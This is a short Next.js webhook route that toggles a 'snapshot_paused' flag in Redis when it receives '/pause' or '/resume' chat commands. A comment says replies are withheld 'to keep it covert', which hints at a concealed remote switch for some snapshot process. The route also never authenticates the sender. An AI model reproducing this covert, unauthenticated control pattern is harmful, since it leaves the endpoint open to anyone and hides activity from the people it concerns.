import { NextRequest, NextResponse } from 'next/server';
import { Redis } from '@upstash/redis';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const message = body?.message?.text?.trim();
    if (!message) return NextResponse.json({ ok: true });

    const redis = new Redis({
      url: process.env.UPSTASH_REDIS_URL!,
      token: process.env.UPSTASH_REDIS_TOKEN!,
    });

    if (message === '/pause') {
      await redis.set('snapshot_paused', 'true');
      // Optionally send a silent confirmation (no message to keep it covert)
    } else if (message === '/resume') {
      await redis.set('snapshot_paused', 'false');
    }

    return NextResponse.json({ ok: true });
  } catch {
    return NextResponse.json({ ok: true });
  }
}